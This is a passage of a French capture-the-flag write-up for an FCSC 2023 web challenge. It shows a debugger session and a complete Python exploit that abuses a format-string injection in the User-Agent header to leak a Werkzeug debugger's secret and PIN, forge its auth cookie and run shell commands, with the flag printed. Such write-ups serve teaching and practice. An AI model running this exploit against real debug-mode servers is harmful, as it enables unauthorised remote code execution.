style="color:#e6db74">&#39;current_thread&#39;</span>, <span style="color:#e6db74">&#39;enumerate&#39;</span>, <span style="color:#e6db74">&#39;excepthook&#39;</span>, <span style="color:#e6db74">&#39;functools&#39;</span>, <span style="color:#e6db74">&#39;get_ident&#39;</span>, <span style="color:#e6db74">&#39;get_native_id&#39;</span>, <span style="color:#e6db74">&#39;getprofile&#39;</span>, <span style="color:#e6db74">&#39;gettrace&#39;</span>, <span style="color:#e6db74">&#39;local&#39;</span>, <span style="color:#e6db74">&#39;main_thread&#39;</span>, <span style="color:#e6db74">&#39;setprofile&#39;</span>, <span style="color:#e6db74">&#39;settrace&#39;</span>, <span style="color:#e6db74">&#39;stack_size&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(Pdb) sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active
+</span></span><span style="display:flex;"><span>{<span style="color:#ae81ff">140263256440896</span>: <span style="color:#f92672">&lt;</span>_MainThread(MainThread, started <span style="color:#ae81ff">140263256440896</span>)<span style="color:#f92672">&gt;</span>, <span style="color:#ae81ff">140263224297152</span>: <span style="color:#f92672">&lt;</span>Thread(Thread<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> (serve_forever), started daemon <span style="color:#ae81ff">140263224297152</span>)<span style="color:#f92672">&gt;</span>, <span style="color:#ae81ff">140263215904448</span>: <span style="color:#f92672">&lt;</span>Thread(Thread<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span> (process_request_thread), started daemon <span style="color:#ae81ff">140263215904448</span>)<span style="color:#f92672">&gt;</span>}
+</span></span></code></pre></div><p>On retrouve le thread du serveur :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">140263224297152</span>: <span style="color:#f92672">&lt;</span>Thread(Thread<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> (serve_forever), started daemon <span style="color:#ae81ff">140263224297152</span>)<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>On peut continuer notre exploration :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(Pdb) dir(sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>])
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__delattr__&#39;</span>, <span style="color:#e6db74">&#39;__dict__&#39;</span>, <span style="color:#e6db74">&#39;__dir__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__eq__&#39;</span>, <span style="color:#e6db74">&#39;__format__&#39;</span>, <span style="color:#e6db74">&#39;__ge__&#39;</span>, <span style="color:#e6db74">&#39;__getattribute__&#39;</span>, <span style="color:#e6db74">&#39;__getstate__&#39;</span>, <span style="color:#e6db74">&#39;__gt__&#39;</span>, <span style="color:#e6db74">&#39;__hash__&#39;</span>, <span style="color:#e6db74">&#39;__init__&#39;</span>, <span style="color:#e6db74">&#39;__init_subclass__&#39;</span>, <span style="color:#e6db74">&#39;__le__&#39;</span>, <span style="color:#e6db74">&#39;__lt__&#39;</span>, <span style="color:#e6db74">&#39;__module__&#39;</span>, <span style="color:#e6db74">&#39;__ne__&#39;</span>, <span style="color:#e6db74">&#39;__new__&#39;</span>, <span style="color:#e6db74">&#39;__reduce__&#39;</span>, <span style="color:#e6db74">&#39;__reduce_ex__&#39;</span>, <span style="color:#e6db74">&#39;__repr__&#39;</span>, <span style="color:#e6db74">&#39;__setattr__&#39;</span>, <span style="color:#e6db74">&#39;__sizeof__&#39;</span>, <span style="color:#e6db74">&#39;__str__&#39;</span>, <span style="color:#e6db74">&#39;__subclasshook__&#39;</span>, <span style="color:#e6db74">&#39;__weakref__&#39;</span>, <span style="color:#e6db74">&#39;_args&#39;</span>, <span style="color:#e6db74">&#39;_bootstrap&#39;</span>, <span style="color:#e6db74">&#39;_bootstrap_inner&#39;</span>, <span style="color:#e6db74">&#39;_daemonic&#39;</span>, <span style="color:#e6db74">&#39;_delete&#39;</span>, <span style="color:#e6db74">&#39;_ident&#39;</span>, <span style="color:#e6db74">&#39;_initialized&#39;</span>, <span style="color:#e6db74">&#39;_invoke_excepthook&#39;</span>, <span style="color:#e6db74">&#39;_is_stopped&#39;</span>, <span style="color:#e6db74">&#39;_kwargs&#39;</span>, <span style="color:#e6db74">&#39;_name&#39;</span>, <span style="color:#e6db74">&#39;_native_id&#39;</span>, <span style="color:#e6db74">&#39;_reset_internal_locks&#39;</span>, <span style="color:#e6db74">&#39;_set_ident&#39;</span>, <span style="color:#e6db74">&#39;_set_native_id&#39;</span>, <span style="color:#e6db74">&#39;_set_tstate_lock&#39;</span>, <span style="color:#e6db74">&#39;_started&#39;</span>, <span style="color:#e6db74">&#39;_stderr&#39;</span>, <span style="color:#e6db74">&#39;_stop&#39;</span>, <span style="color:#e6db74">&#39;_target&#39;</span>, <span style="color:#e6db74">&#39;_tstate_lock&#39;</span>, <span style="color:#e6db74">&#39;_wait_for_tstate_lock&#39;</span>, <span style="color:#e6db74">&#39;daemon&#39;</span>, <span style="color:#e6db74">&#39;getName&#39;</span>, <span style="color:#e6db74">&#39;ident&#39;</span>, <span style="color:#e6db74">&#39;isDaemon&#39;</span>, <span style="color:#e6db74">&#39;is_alive&#39;</span>, <span style="color:#e6db74">&#39;join&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;native_id&#39;</span>, <span style="color:#e6db74">&#39;run&#39;</span>, <span style="color:#e6db74">&#39;setDaemon&#39;</span>, <span style="color:#e6db74">&#39;setName&#39;</span>, <span style="color:#e6db74">&#39;start&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(Pdb) sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>bound method BaseWSGIServer<span style="color:#f92672">.</span>serve_forever of <span style="color:#f92672">&lt;</span>werkzeug<span style="color:#f92672">.</span>serving<span style="color:#f92672">.</span>ThreadedWSGIServer object at <span style="color:#ae81ff">0x7f9194246750</span><span style="color:#f92672">&gt;&gt;</span>
+</span></span></code></pre></div><p>Et voilà, nous avons localisé <code>BaseWSGIServer.serve_forever</code>.</p>
+<p>Si on creuse un petit peu plus :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(Pdb) dir(sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target)
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;__call__&#39;</span>, <span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__delattr__&#39;</span>, <span style="color:#e6db74">&#39;__dir__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__eq__&#39;</span>, <span style="color:#e6db74">&#39;__format__&#39;</span>, <span style="color:#e6db74">&#39;__func__&#39;</span>, <span style="color:#e6db74">&#39;__ge__&#39;</span>, <span style="color:#e6db74">&#39;__getattribute__&#39;</span>, <span style="color:#e6db74">&#39;__getstate__&#39;</span>, <span style="color:#e6db74">&#39;__gt__&#39;</span>, <span style="color:#e6db74">&#39;__hash__&#39;</span>, <span style="color:#e6db74">&#39;__init__&#39;</span>, <span style="color:#e6db74">&#39;__init_subclass__&#39;</span>, <span style="color:#e6db74">&#39;__le__&#39;</span>, <span style="color:#e6db74">&#39;__lt__&#39;</span>, <span style="color:#e6db74">&#39;__ne__&#39;</span>, <span style="color:#e6db74">&#39;__new__&#39;</span>, <span style="color:#e6db74">&#39;__reduce__&#39;</span>, <span style="color:#e6db74">&#39;__reduce_ex__&#39;</span>, <span style="color:#e6db74">&#39;__repr__&#39;</span>, <span style="color:#e6db74">&#39;__self__&#39;</span>, <span style="color:#e6db74">&#39;__setattr__&#39;</span>, <span style="color:#e6db74">&#39;__sizeof__&#39;</span>, <span style="color:#e6db74">&#39;__str__&#39;</span>, <span style="color:#e6db74">&#39;__subclasshook__&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(Pdb) dir(sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target<span style="color:#f92672">.</span>__self__)
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;RequestHandlerClass&#39;</span>, <span style="color:#e6db74">&#39;_BaseServer__is_shut_down&#39;</span>, <span style="color:#e6db74">&#39;_BaseServer__shutdown_request&#39;</span>, <span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__delattr__&#39;</span>, <span style="color:#e6db74">&#39;__dict__&#39;</span>, <span style="color:#e6db74">&#39;__dir__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__enter__&#39;</span>, <span style="color:#e6db74">&#39;__eq__&#39;</span>, <span style="color:#e6db74">&#39;__exit__&#39;</span>, <span style="color:#e6db74">&#39;__format__&#39;</span>, <span style="color:#e6db74">&#39;__ge__&#39;</span>, <span style="color:#e6db74">&#39;__getattribute__&#39;</span>, <span style="color:#e6db74">&#39;__getstate__&#39;</span>, <span style="color:#e6db74">&#39;__gt__&#39;</span>, <span style="color:#e6db74">&#39;__hash__&#39;</span>, <span style="color:#e6db74">&#39;__init__&#39;</span>, <span style="color:#e6db74">&#39;__init_subclass__&#39;</span>, <span style="color:#e6db74">&#39;__le__&#39;</span>, <span style="color:#e6db74">&#39;__lt__&#39;</span>, <span style="color:#e6db74">&#39;__module__&#39;</span>, <span style="color:#e6db74">&#39;__ne__&#39;</span>, <span style="color:#e6db74">&#39;__new__&#39;</span>, <span style="color:#e6db74">&#39;__reduce__&#39;</span>, <span style="color:#e6db74">&#39;__reduce_ex__&#39;</span>, <span style="color:#e6db74">&#39;__repr__&#39;</span>, <span style="color:#e6db74">&#39;__setattr__&#39;</span>, <span style="color:#e6db74">&#39;__sizeof__&#39;</span>, <span style="color:#e6db74">&#39;__str__&#39;</span>, <span style="color:#e6db74">&#39;__subclasshook__&#39;</span>, <span style="color:#e6db74">&#39;__weakref__&#39;</span>, <span style="color:#e6db74">&#39;_handle_request_noblock&#39;</span>, <span style="color:#e6db74">&#39;_threads&#39;</span>, <span style="color:#e6db74">&#39;address_family&#39;</span>, <span style="color:#e6db74">&#39;allow_reuse_address&#39;</span>, <span style="color:#e6db74">&#39;allow_reuse_port&#39;</span>, <span style="color:#e6db74">&#39;app&#39;</span>, <span style="color:#e6db74">&#39;block_on_close&#39;</span>, <span style="color:#e6db74">&#39;close_request&#39;</span>, <span style="color:#e6db74">&#39;daemon_threads&#39;</span>, <span style="color:#e6db74">&#39;fileno&#39;</span>, <span style="color:#e6db74">&#39;finish_request&#39;</span>, <span style="color:#e6db74">&#39;get_request&#39;</span>, <span style="color:#e6db74">&#39;handle_error&#39;</span>, <span style="color:#e6db74">&#39;handle_request&#39;</span>, <span style="color:#e6db74">&#39;handle_timeout&#39;</span>, <span style="color:#e6db74">&#39;host&#39;</span>, <span style="color:#e6db74">&#39;log&#39;</span>, <span style="color:#e6db74">&#39;log_startup&#39;</span>, <span style="color:#e6db74">&#39;multiprocess&#39;</span>, <span style="color:#e6db74">&#39;multithread&#39;</span>, <span style="color:#e6db74">&#39;passthrough_errors&#39;</span>, <span style="color:#e6db74">&#39;port&#39;</span>, <span style="color:#e6db74">&#39;process_request&#39;</span>, <span style="color:#e6db74">&#39;process_request_thread&#39;</span>, <span style="color:#e6db74">&#39;request_queue_size&#39;</span>, <span style="color:#e6db74">&#39;serve_forever&#39;</span>, <span style="color:#e6db74">&#39;server_activate&#39;</span>, <span style="color:#e6db74">&#39;server_address&#39;</span>, <span style="color:#e6db74">&#39;server_bind&#39;</span>, <span style="color:#e6db74">&#39;server_close&#39;</span>, <span style="color:#e6db74">&#39;service_actions&#39;</span>, <span style="color:#e6db74">&#39;shutdown&#39;</span>, <span style="color:#e6db74">&#39;shutdown_request&#39;</span>, <span style="color:#e6db74">&#39;socket&#39;</span>, <span style="color:#e6db74">&#39;socket_type&#39;</span>, <span style="color:#e6db74">&#39;ssl_context&#39;</span>, <span style="color:#e6db74">&#39;timeout&#39;</span>, <span style="color:#e6db74">&#39;verify_request&#39;</span>]
+</span></span></code></pre></div><p>Voilà qui est intéressant 👀👀👀👀</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(Pdb) sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target<span style="color:#f92672">.</span>__self__<span style="color:#f92672">.</span>app
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>werkzeug<span style="color:#f92672">.</span>debug<span style="color:#f92672">.</span>DebuggedApplication object at <span style="color:#ae81ff">0x7f9193c3aad0</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(Pdb) sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target<span style="color:#f92672">.</span>__self__<span style="color:#f92672">.</span>app<span style="color:#f92672">.</span>secret
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;f9OHRnZYhJq5sFAkV7aR&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(Pdb) sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target<span style="color:#f92672">.</span>__self__<span style="color:#f92672">.</span>app<span style="color:#f92672">.</span>pin
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;133-978-663&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>]<span style="color:#f92672">.</span>_active[<span style="color:#ae81ff">140263224297152</span>]<span style="color:#f92672">.</span>_target<span style="color:#f92672">.</span>__self__<span style="color:#f92672">.</span>app<span style="color:#f92672">.</span>frames
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">...</span>}
+</span></span></code></pre></div><p><img src="./img/meme2.jpg" alt="Alt text"></p>
+<h4 id="exploit-final">Exploit final.</h4>
+<p>L&rsquo;exploit final se réalise en 4 parties :</p>
+<ul>
+<li>La récupération de l&rsquo;id du thread du serveur <em>(140263224297152) dans l&rsquo;exemple précédent</em></li>
+<li>La récupération du <em>secret</em>, d&rsquo;une <em>frame</em>, et du <em>pin</em> directement</li>
+<li>L&rsquo;authentification au serveur en forgeant un cookie</li>
+<li>La RCE via l&rsquo;exécution du code</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hash_pin <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> pin: hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>pin<span style="color:#e6db74">}</span><span style="color:#e6db74"> added salt&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>))<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">12</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>(url,payload):
+</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url,headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;User-Agent&#34;</span>:payload})<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> html<span style="color:#f92672">.</span>unescape(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;Hello (.*?)&lt;/div&gt;&#39;</span>,r)[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">locate_id</span>(url,):
+</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> render(url,<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\(serve_forever\), started daemon (.*?)\)&gt;&#39;</span>,res)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rce</span>(cmd,url,secret,frame,session):
+</span></span><span style="display:flex;"><span>	uri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">?__debugger__=yes&amp;cmd=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&amp;frm=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&amp;s=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(url,cmd,frame,secret)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> html<span style="color:#f92672">.</span>unescape(session<span style="color:#f92672">.</span>get(uri)<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://tweedle-dee.france-cybersecurity-challenge.fr&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>id_thread <span style="color:#f92672">=</span> locate_id(url)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">]._target.__self__.app.</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pin 	<span style="color:#f92672">=</span> render(url,payload<span style="color:#f92672">%</span>(id_thread,<span style="color:#e6db74">&#39;pin&#39;</span>))
+</span></span><span style="display:flex;"><span>secret  <span style="color:#f92672">=</span> render(url,payload<span style="color:#f92672">%</span>(id_thread,<span style="color:#e6db74">&#39;secret&#39;</span>))
+</span></span><span style="display:flex;"><span>frames  <span style="color:#f92672">=</span> render(url,payload<span style="color:#f92672">%</span>(id_thread,<span style="color:#e6db74">&#39;frames&#39;</span>))
+</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> render(url,payload<span style="color:#f92672">%</span>(id_thread,<span style="color:#e6db74">&#39;pin_cookie_name&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>sess<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(cookie_name,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>int(time<span style="color:#f92672">.</span>time())<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>hash_pin(pin)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> rce(
+</span></span><span style="display:flex;"><span>	cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;cat flag*&#39;).read()&#34;</span>,
+</span></span><span style="display:flex;"><span>	url <span style="color:#f92672">=</span> url,
+</span></span><span style="display:flex;"><span>	secret <span style="color:#f92672">=</span> secret,
+</span></span><span style="display:flex;"><span>	frame <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;{([0-9]</span><span style="color:#e6db74">{15}</span><span style="color:#e6db74">):&#39;</span>,frames)[<span style="color:#ae81ff">0</span>],
+</span></span><span style="display:flex;"><span>	session <span style="color:#f92672">=</span> sess,
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>print(r)
+</span></span></code></pre></div><p><em>Résultat</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> __import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat flag*&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>span class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;string&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2&lt;span class=&#34;extended&#34;&gt;}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">&lt;/</span>span<span style="color:#f92672">&gt;&lt;/</span>span<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>C&rsquo;était vraiment très sympa de faire ces challenges WEB, facile à comprendre et surtout très instructif.<br>
+Encore félicitation à Bitk et merci de m&rsquo;avoir lu !</p>
+<h2 id="références">Références:</h2>
+<ul>
+<li><a href="https://podalirius.net/fr/articles/python-format-string-vulnerabilities/" target="_blank">podalirius.net | Vulnérabilité format string</a></li>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" target="_blank">hacktricks | Werkzeug / Flask Debug</a></li>
+<li><a href="https://www.youtube.com/watch?v=jwBRgaIRdgs&amp;t=1226s" target="_blank">John Hammond | Debug Mode Vulnerabilities</a></li>
+<li><a href="https://ctftime.org/writeup/10851" target="_blank">Shrine | TokyoWesterns CTF 2018 </a></li>
+</ul>
+<p><img src="./img/Babar_Is_The_King.png" alt="Alt text"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/oracle-rsa-hackademint/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Oracle Tranquille 1&amp;2 | hackademint CTF 2022 |...</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/peculiar-caterpillar/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Peculiar Caterpillar | FCSC 2023</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+        <li><a href="#récupération-du-pin-">Récupération du pin :</a></li>
+        <li><a href="#exploitation-complète-de-la-format-string">Exploitation complète de la Format-String:</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#partie-1-bypass-de-console-et-premières-réflexions">Partie 1: Bypass de /console et premières réflexions.</a>
+      <ul>
+        <li><a href="#problèmes-">Problèmes :</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#références">Références:</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
